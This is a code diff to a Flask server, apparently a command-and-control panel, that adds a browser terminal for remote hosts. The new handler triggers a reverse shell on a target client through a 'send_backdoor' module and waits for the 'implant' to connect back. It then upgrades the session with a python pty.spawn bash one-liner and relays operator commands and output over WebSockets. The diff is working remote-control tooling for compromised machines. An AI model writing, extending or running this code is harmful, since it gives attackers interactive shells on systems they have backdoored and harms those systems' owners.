@@ -3,7 +3,9 @@ import datetime
 import hashlib
 import logging
 import os
+import socket
 import sqlite3
+import threading
 from functools import wraps
 
 import jwt
@@ -11,8 +13,10 @@ from apscheduler.schedulers.background import BackgroundScheduler
 from dotenv import load_dotenv
 from flask import Flask, g, jsonify, request
 from flask_cors import CORS
+from flask_socketio import SocketIO, emit
 
 from ping import ping, ping_batch
+from send_backdoor import trigger_reverse_shell
 from send_cmd import send_command
 
 load_dotenv()
@@ -23,8 +27,12 @@ app = Flask(__name__)
 JWT_SECRET = os.environ["JWT_SECRET"]
 JWT_EXPIRATION_HOURS = 24
 CORS(app)
+socketio = SocketIO(app, cors_allowed_origins="*")
 
 DATABASE = os.path.join(os.path.dirname(__file__), "dixie.db")
+
+# Active terminal sessions: sid -> { listener, conn, thread, active }
+terminal_sessions = {}
 
 
 def get_db():
@@ -514,6 +522,145 @@ def update_settings():
     return jsonify({"message": "Settings updated"})
 
 
+# ---------------------------------------------------------------------------
+# WebSocket terminal handlers
+# ---------------------------------------------------------------------------
+
+
+@socketio.on("connect")
+def handle_connect(auth):
+    if not auth or "token" not in auth:
+        return False
+    try:
+        jwt.decode(auth["token"], JWT_SECRET, algorithms=["HS256"])
+    except (jwt.ExpiredSignatureError, jwt.InvalidTokenError):
+        return False
+
+
+@socketio.on("start_terminal")
+def handle_start_terminal(data):
+    sid = request.sid
+    client_id = data.get("client_id")
+
+    db = sqlite3.connect(DATABASE)
+    db.row_factory = sqlite3.Row
+    client = db.execute("SELECT * FROM clients WHERE id = ?", (client_id,)).fetchone()
+    db.close()
+
+    if not client:
+        emit("terminal_error", {"message": "Client not found"})
+        return
+
+    # Bind a TCP listener on a free port
+    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    listener.bind(("", 0))
+    listen_port = listener.getsockname()[1]
+    listener.listen(1)
+    listener.settimeout(30)
+
+    try:
+        trigger_reverse_shell(client["ip_address"], client["target_port"], listen_port)
+    except Exception as e:
+        listener.close()
+        emit("terminal_error", {"message": f"Failed to trigger shell: {e}"})
+        return
+
+    session = {
+        "listener": listener,
+        "conn": None,
+        "thread": None,
+        "active": True,
+    }
+    terminal_sessions[sid] = session
+
+    def session_worker():
+        try:
+            conn, addr = listener.accept()
+            conn.settimeout(0.5)
+            session["conn"] = conn
+
+            # Upgrade to a proper PTY so we get echo, line editing, etc.
+            import time
+            time.sleep(0.3)
+            conn.sendall(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
+            time.sleep(0.5)
+            conn.sendall(b"clear\n")
+            time.sleep(0.3)
+            # Drain the upgrade + clear output so it doesn't clutter the terminal
+            try:
+                while True:
+                    conn.recv(4096)
+            except socket.timeout:
+                pass
+
+            socketio.emit("terminal_ready", {}, to=sid)
+
+            while session["active"]:
+                try:
+                    data = conn.recv(4096)
+                    if not data:
+                        break
+                    socketio.emit(
+                        "terminal_output",
+                        {"data": data.decode("utf-8", errors="replace")},
+                        to=sid,
+                    )
+                except socket.timeout:
+                    continue
+                except OSError:
+                    break
+        except socket.timeout:
+            socketio.emit(
+                "terminal_error",
+                {"message": "Implant did not connect back within timeout"},
+                to=sid,
+            )
+        except Exception as e:
+            socketio.emit("terminal_error", {"message": str(e)}, to=sid)
+        finally:
+            _cleanup_session(sid)
+            socketio.emit("terminal_closed", {}, to=sid)
+
+    t = threading.Thread(target=session_worker, daemon=True)
+    session["thread"] = t
+    t.start()
+
+    emit("terminal_waiting", {"port": listen_port})
+
+
+@socketio.on("terminal_input")
+def handle_terminal_input(data):
+    sid = request.sid
+    session = terminal_sessions.get(sid)
+    if not session or not session["conn"]:
+        return
+    try:
+        session["conn"].sendall(data["data"].encode("utf-8"))
+    except OSError:
+        _cleanup_session(sid)
+        emit("terminal_closed", {})
+
+
+def _cleanup_session(sid):
+    session = terminal_sessions.pop(sid, None)
+    if not session:
+        return
+    session["active"] = False
+    for key in ("conn", "listener"):
+        sock = session.get(key)
+        if sock:
+            try:
+                sock.close()
+            except OSError:
+                pass
+
+
+@socketio.on("disconnect")
+def handle_disconnect():
+    _cleanup_session(request.sid)
+
+
 logger = logging.getLogger(__name__)
 
 
@@ -605,4 +752,4 @@ with app.app_context():
 
 
 if __name__ == "__main__":
-    app.run(debug=True, port=5001)
+    socketio.run(app, debug=True, port=5001)
